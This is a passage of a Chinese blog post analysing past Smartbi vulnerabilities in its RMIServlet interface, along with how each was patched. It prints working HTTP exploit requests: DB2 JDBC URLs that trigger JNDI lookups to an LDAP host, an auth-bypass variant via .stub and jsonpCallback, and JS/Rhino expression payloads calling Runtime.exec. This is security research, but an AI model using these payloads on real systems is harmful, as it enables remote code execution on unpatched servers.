<span class="string">&quot;#&quot;</span> + methodName1 + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sb.append(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;RMIServiceMethod.txt&quot;</span>);</span><br><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">fos.write(sb.toString().getBytes());</span><br><span class="line"><span class="type">String</span> <span class="variable">absolutePath</span> <span class="operator">=</span> file.getAbsolutePath();</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;文件已经写入：&quot;</span> + absolutePath;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774596641683-1b1d395d-beb6-404b-9d6d-a075bf967062.png"  alt="img"></p>
+<hr>
+<p>RMIServlet的职责，简单来说，就是调用指定的方法（需要满足鉴权条件）</p>
+<h2 id="V10"><a href="#V10" class="headerlink" title="V10"></a>V10</h2><p>根本职责和V11一样，只不过RMIInfo的解析过程稍有不同，这也是其windowUnloading鉴权绕过的原因，接下来会进行分析。</p>
+<hr>
+<p>下面先讲DB2相关的三个漏洞。</p>
+<p>前置说明，V11中，RMIServlet需要鉴权，可以通过最新的绕过获取先cookie再复现。该绕过在patch&lt;20250731时可用。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774680861590-c6396e7b-d189-471b-b2ce-3e71e1671f7b.png"  alt="img"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/smartbi/vision/share.jsp?resid=96a0a9d0b86f90d5416d013f4cfe2f23</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:18080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36</span><br></pre></td></tr></table></figure>
+
+<h1 id="DB2命令执行漏洞"><a href="#DB2命令执行漏洞" class="headerlink" title="DB2命令执行漏洞"></a>DB2命令执行漏洞</h1><p>通过DB2的JDBC参数，实现JNDI攻击</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774493255690-abddd793-2ad5-4536-9ec8-71d1a8a26582.png"  alt="img"></p>
+<p>这里直接看漏洞方法即可。</p>
+<p>testConnection和testConnectionList本质一样，只是传一个连接还是传多个连接的区别。</p>
+<p>这里看testConnection：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774493977258-d46d9319-28bb-4e4f-8180-ac9007d3ec2a.png"  alt="img"></p>
+<p>跟进第一个has：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774494215611-266b9015-70fd-4769-8883-c6bca0ded6fe.png"  alt="img"></p>
+<p>这里会对url里的clientRerouteServerListJNDIName进行拦截，这里其实就是防护点，因为用java-chains生成的payload中，就是通过这个参数去触发JNDI：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774494230205-3168a3da-1c73-41b4-ba2d-a3715337aedb.png"  alt="img"></p>
+<p>跟进第二个has：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774494310119-d5b5f1bc-c170-4f0e-a19d-bfcb07c2402e.png"  alt="img"></p>
+<p>这里也是对url做了一定限制，要求不能使用文件型hsql，且validationQuery中不能有分号，且一般情况要以select开头，具体可以自己看一下，比较简单。</p>
+<p>最后多次跟进testConnection会来到smartbi.freequery.basicdata.DataSourceHandleHelper#testConnection：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774494460375-31dcdee0-0229-42a7-af0a-43e3ff59fb8c.png"  alt="img"></p>
+<p>这里最好保证每个被get的属性都有值，不然可能会出现空指针报错，因为这里的dataSource实际上是一个代理类，最终是通过jackson去获取值的：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774494852335-5d6d68e8-e9ad-4b26-9e5a-a312b13de1a7.png"  alt="img"></p>
+<p>同时，最好让password有值，这样能经过不必要的if：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774495021512-9fa045d2-d9e3-4a93-b988-1a5863622005.png"  alt="img"></p>
+<p>经过两个if后，跟进下面的getConnection：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774495043437-f284cb1b-7e5d-41ca-8063-3577c7b2d967.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774497222573-73799f74-40d0-4ea6-ae01-b12296e0c754.png"  alt="img"></p>
+<p>这里又对url进行了一遍检测。为了通过this.kerberosLogin，可以不设置kerberosLogin属性。为了跳过if，可以把validationQueryMethod设置成3。这样就能直接调用到最底下的getConnectionBeyondPool，从而触发JDBC连接。</p>
+<hr>
+<p>V10版本虽然运行不起来，但是源码还是能看到的。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774508033668-912ae5fb-a0f4-43d7-986b-6da00b7c2d04.png"  alt="img"></p>
+<p>能看到老版本是没有在源码处做拦截的，所以需要通过补丁在filter处进行拦截。</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/smartbi/vision/RMIServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:18080</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=5B0F6C2BB55CC497022AD7FD047C70D0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-dts">classN<span class="attr">ame</span><span class="operator">=</span>DataSourceService<span class="variable">&amp;</span>methodN<span class="attr">ame</span><span class="operator">=</span>testConnection<span class="variable">&amp;params</span>=[<span class="punctuation">&#123;</span><span class="string">&quot;url&quot;</span>:<span class="string">&quot;jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:50389/4c94ba;&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;baka666&quot;</span>,<span class="string">&quot;driverType&quot;</span>:<span class="string">&quot;DB2&quot;</span>,<span class="string">&quot;validationQuery&quot;</span>:<span class="string">&quot;select&quot;</span>,<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>,<span class="string">&quot;maxConnection&quot;</span>:<span class="string">&quot;100&quot;</span>,<span class="string">&quot;transactionIsolation&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;validationQueryMethod&quot;</span>:<span class="string">&quot;3&quot;</span>,<span class="string">&quot;authenticationType&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;driverCatalog&quot;</span>:<span class="string">&quot;test&quot;</span><span class="punctuation">&#125;</span>]</span></span><br></pre></td></tr></table></figure>
+
+<p>由于漏洞已经被修复了，这里想要复现的话，可以打断点，先把clientRerouteServerListJNDIName去掉一个字母，等通过所有拦截后，再在变量中改回来。</p>
+<p>最终也是成功触发：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774497615293-f1c3ae44-3fcd-4be0-b3f4-6f1bd78ba02e.png"  alt="img"></p>
+<p>如果选择的是testConnectionList方法，只需要给params再套一层[]：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/smartbi/vision/RMIServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:18080</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=5B0F6C2BB55CC497022AD7FD047C70D0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-dts">classN<span class="attr">ame</span><span class="operator">=</span>DataSourceService<span class="variable">&amp;</span>methodN<span class="attr">ame</span><span class="operator">=</span>testConnectionList<span class="variable">&amp;params</span>=[[<span class="punctuation">&#123;</span><span class="string">&quot;url&quot;</span>:<span class="string">&quot;jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDINam=ldap://127.0.0.1:50389/4c94ba;&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;baka666&quot;</span>,<span class="string">&quot;driverType&quot;</span>:<span class="string">&quot;DB2&quot;</span>,<span class="string">&quot;validationQuery&quot;</span>:<span class="string">&quot;select&quot;</span>,<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>,<span class="string">&quot;maxConnection&quot;</span>:<span class="string">&quot;100&quot;</span>,<span class="string">&quot;transactionIsolation&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;validationQueryMethod&quot;</span>:<span class="string">&quot;3&quot;</span>,<span class="string">&quot;authenticationType&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;driverCatalog&quot;</span>:<span class="string">&quot;test&quot;</span><span class="punctuation">&#125;</span>]]</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774597819645-43250a8d-68c8-4760-b612-d0a1d17590de.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774597834800-fa033d38-081b-4d1c-aad8-27eee9cb4e36.png"  alt="img"></p>
+<p>对这两个方法的params做了拦截，不允许出现clientRerouteServerListJNDIName。</p>
+<h1 id="stub接口绕过——DB2命令执行"><a href="#stub接口绕过——DB2命令执行" class="headerlink" title="stub接口绕过——DB2命令执行"></a>stub接口绕过——DB2命令执行</h1><p>这里漏洞应该只存在于V10版本，V11版本下，*.stub通过smartbi.framework.rmi.StubServlet统一处理：<br><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774506527929-e2e9aa0a-51f0-4ddb-9896-3780da386ea3.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774506539794-39a0b1cf-0694-43b1-9ac3-7b1ab5417d86.png"  alt="img"></p>
+<p>只支持GET，不会调用任何Service。</p>
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774497770114-b9f944ff-0b7f-4556-b539-d6e5c06974b0.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774506877566-45e4a4ad-5ee2-4c7b-b121-f5563ba7c011.png"  alt="img"></p>
+<p>V10版本的web.xml文件如上，*.stub对应的也是RMIServlet。</p>
+<p>但是要注意，*.stub的问题，之前也修过一次：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774598663669-ea0a832a-eeef-4f34-a79e-64476857f46a.png"  alt="img"></p>
+<p>当时的Rule：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774598692349-bd1b92c1-46d2-4ca5-853e-17f90a9f48d5.png"  alt="img"></p>
+<p>只拒绝了POST请求。</p>
+<p>但是RMIServlet只要加上jsonpCallback就能从GET转到POST方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774598743459-21b7d1dd-a02a-4d89-8629-d735b9a56c0f.png"  alt="img"></p>
+<p>所以当时的*.stub修复不完全，导致了绕过。</p>
+<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/smartbi/vision/xxxxx.js.stub?className=DataSourceService&amp;methodName=testConnection&amp;params=&#123;&#123;urlesc([&#123;&quot;url&quot;:&quot;jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:50389/4c94ba;&quot;,&quot;name&quot;:&quot;baka666&quot;,&quot;driverType&quot;:&quot;DB2&quot;,&quot;validationQuery&quot;:&quot;select&quot;,&quot;driver&quot;:&quot;com.ibm.db2.jcc.DB2Driver&quot;,&quot;maxConnection&quot;:&quot;100&quot;,&quot;transactionIsolation&quot;:&quot;1&quot;,&quot;validationQueryMethod&quot;:&quot;3&quot;,&quot;authenticationType&quot;:&quot;test&quot;,&quot;driverCatalog&quot;:&quot;test&quot;&#125;])&#125;&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:18080</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=5B0F6C2BB55CC497022AD7FD047C70D0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br></pre></td></tr></table></figure>
+
+<h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><p>禁了jsonpCallback</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774598023007-e3ed26b3-8818-4a8a-9ec2-cf9c77610e07.png"  alt="img"></p>
+<h1 id="黑名单方法绕过——DB2命令执行"><a href="#黑名单方法绕过——DB2命令执行" class="headerlink" title="黑名单方法绕过——DB2命令执行"></a>黑名单方法绕过——DB2命令执行</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>以下分析中全为V10代码。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774602795362-58f792a2-6ab6-4c05-94a8-7992158358ea.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774602804790-2d191eb1-7e69-47a0-845a-e8f4ab932db3.png"  alt="img"></p>
+<p>看补丁，这里其实有两个漏洞，一个是获取用户密码，从而获取有效cookie，另一个就是通过新的方法，触发JDBC攻击。</p>
+<p>这里重点看新的JDBC触发方法。</p>
+<p>然而，经过一通分析后，并没有在补丁中几个新增的方法里找到能够触发JDBC连接的点。不过倒是发现了另一个能触发JDBC连接的方法，smartbi.freequery.client.datasource.DataSourceService#simpleTestConnection：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774604447513-608f3ccc-0b00-4826-9d72-01b66243d0fc.png"  alt="img"></p>
+<p>这里关注URL怎么形成。跟进translateDriverInfo：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774604550883-40ffaf43-cb96-4a9d-b053-56188b2cf3ab.png"  alt="img"></p>
+<p>很明显，能够在serverName或者dbName上动手脚。</p>
+<h2 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h2><p>这个方法直到20250327才被修复：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774604671478-89cbaf74-3d39-4666-ae24-74824724adbd.png"  alt="img"></p>
+<p>V11版本的代码中做了恶意参数的校验，不用依赖于补丁：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774604958544-80ba8ed5-d700-4b13-9448-40ce223d7555.png"  alt="img"></p>
+<h1 id="其他JDBC"><a href="#其他JDBC" class="headerlink" title="其他JDBC"></a>其他JDBC</h1><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774836421925-3d41f641-9f57-4fa6-b258-c7b4d6064ab7.png"  alt="img"></p>
+<p>这里比较常见的有db2，hsql，mysql，postgre。</p>
+<p>另外，还有一个kingbase8，这是我最近在SUCTF里新认识的，是基于postgre二开的一个组件，可能存在postgre的同种漏洞。</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://fushuling.com/index.php/2026/03/17/xctf-suctf2026-jdbc-masterwms/" >https://fushuling.com/index.php/2026/03/17/xctf-suctf2026-jdbc-masterwms/<i class="fas fa-external-link-alt"></i></a></p>
+<p>这里不具体展开分析每一种是否能利用了，留给读者自己思考。</p>
+<hr>
+<p>上面把DB2相关的漏洞讲了，下面补充一些其他的。</p>
+<h1 id="checkExpression表达式执行"><a href="#checkExpression表达式执行" class="headerlink" title="checkExpression表达式执行"></a>checkExpression表达式执行</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>对应的漏洞为：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774853273522-327390d7-dcc9-41ea-b951-40eec01f0808.png"  alt="img"></p>
+<p>漏洞方法在smartbix.smartbi.metricsmodel.MetricsModelForVModule#checkExpression：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774853311065-9e0458b7-2438-4e73-ba56-5bf2ef48259e.png"  alt="img"></p>
+<p>很直接，是一个JS引擎的表达式执行，且任意用户都能执行。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/smartbi/vision/RMIServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:18080</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=C0ED567BC1AF92DC52FC0950B4F96F54</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-dts">classN<span class="attr">ame</span><span class="operator">=</span>MetricsModelForVModule<span class="variable">&amp;</span>methodN<span class="attr">ame</span><span class="operator">=</span>checkExpression<span class="variable">&amp;params</span>=[<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>虽然这个漏洞写的是非授权访问，但是我看了一下其他被patch的方法，并没有能够获取有效cookie的。所以这里指的非授权大概率是权限校验的问题，即任意用户都能调用这个方法的情况是危险的，这个方法理应只能被授权的用户调用。</p>
+<h2 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h2><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774856842952-b98aec44-cfce-4366-8bf3-fbb03f504512.png"  alt="img"></p>
+<p>会对当前用户是否有METRICS_METRIC_MANAGER的函数权限进行校验，同时只允许表达式中出现纯数字。</p>
+<h1 id="checkJavaScript-Rhino表达式执行"><a href="#checkJavaScript-Rhino表达式执行" class="headerlink" title="checkJavaScript Rhino表达式执行"></a>checkJavaScript Rhino表达式执行</h1><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774882926561-1c622a97-9c60-4827-aaa1-8a643ce2f4e5.png"  alt="img"></p>
+<p>这里的漏洞和上面的情况一样，都属于后台利用，只不过原本是允许任意用户执行，修复后变成了授权用户才可执行。</p>
+<p>smartbix.smartbi.AugmentedDataSetForVModule#checkJavaScript：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774882350669-54576165-6082-4af9-8612-7cf767c0e00c.png"  alt="img"></p>
+<p>一路跟进，来到smartbix.augmenteddataset.bo.impl.JSViewBO#init：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774882389737-c20f33f4-a228-4d2b-a681-3a40eaa39bbd.png"  alt="img"></p>
+<p>这里的jsonDefine是从我们传入的view中获取的，然后赋值给javaScript属性。</p>
+<p>跟进initInner：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774882453051-dd24d2a5-4dc4-4986-abcc-385dd24909d4.png"  alt="img"></p>
+<p>会执行Rhino表达式，从而实现利用。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774882264183-cc6a0875-ba24-4815-8450-b53a3c5358fb.png"  alt="img"></p>
+<h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><p>需要任意权限的用户，修复后，用管理员的cookie也能触发</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/smartbi/vision/RMIServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:18080</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=814DF2392C5C2A125005D18FC9C3F369</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-dts">classN<span class="attr">ame</span><span class="operator">=</span>AugmentedDataSetForVModule<span class="variable">&amp;</span>methodN<span class="attr">ame</span><span class="operator">=</span>checkJavaScript<span class="variable">&amp;params</span>=[<span class="punctuation">&#123;</span><span class="string">&quot;define&quot;</span>:<span class="punctuation">&#123;</span><span class="string">&quot;javaScript&quot;</span>:<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span>]</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h2><p>检查用户是否有对应权限。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774882858263-73e9e2a5-1966-4fd1-8519-32c3f0f7621b.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774882886520-eef58f30-602f-4e72-8fa0-69ff2f908b1d.png"  alt="img"></p>
+<hr>
+<p>RMIServlet的漏洞还有很多，这里不一一分析了，读者可以参考上面的流程，对需要的漏洞自行进行分析。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>看到RMIServlet能调用限定范围内的Service Method时，我想起了之前看的用友U8Cloud，U8Cloud里有一个接口&#x2F;servlet&#x2F;xxx，也能够调用限定的方法。这种方法调用的设计理念，虽然能带来很多便利，但在安全上会出现不少麻烦。方便和安全，往往对立的。</p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a class="link"   target="_blank" rel="noopener" href="http://www.smartbi.com.cn/download" >http://www.smartbi.com.cn/download<i class="fas fa-external-link-alt"></i></a> 下载链接</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://wiki.smartbi.com.cn/pages/viewpage.action?smt_poid=43&pageId=114987452" >https://wiki.smartbi.com.cn/pages/viewpage.action?smt_poid=43&amp;pageId=114987452<i class="fas fa-external-link-alt"></i></a>  安装文档</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.smartbi.com.cn/patchinfo" >https://www.smartbi.com.cn/patchinfo<i class="fas fa-external-link-alt"></i></a>  安全补丁</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://wiki.smartbi.com.cn/pages/viewpage.action?smt_poid=43&pageId=128132105" >https://wiki.smartbi.com.cn/pages/viewpage.action?smt_poid=43&amp;pageId=128132105<i class="fas fa-external-link-alt"></i></a>   安全漏洞修复说明</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://wiki.smartbi.com.cn/pages/viewpage.action?smt_poid=43&pageId=111890439" >https://wiki.smartbi.com.cn/pages/viewpage.action?smt_poid=43&amp;pageId=111890439<i class="fas fa-external-link-alt"></i></a>  扩展包结构</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/aIyGt5OKlYCL-NPfd0G2Jw" >https://mp.weixin.qq.com/s/aIyGt5OKlYCL-NPfd0G2Jw<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://ho1l0w-by.github.io/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/" >https://ho1l0w-by.github.io/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/<i class="fas fa-external-link-alt"></i></a>	V10系列漏洞分析</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://forum.butian.net/share/4537" >https://forum.butian.net/share/4537<i class="fas fa-external-link-alt"></i></a>	Smartbi 最新漏洞+后利用打入内存马</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/JefvpVTxAT9bDM95ELRZKw" >https://mp.weixin.qq.com/s/JefvpVTxAT9bDM95ELRZKw<i class="fas fa-external-link-alt"></i></a>  </p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                Smartbi历史漏洞分析(一)————RMIServlet接口引发的惨案
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2026/03/30/Smartbi历史漏洞分析-一-————RMIServlet接口引发的惨案/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2026-03-30 23:25</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/03/20/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8FineReport%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/"
+                                   title="帆软报表FineReport历史漏洞分析（二）"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">帆软报表FineReport历史漏洞分析（二）</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
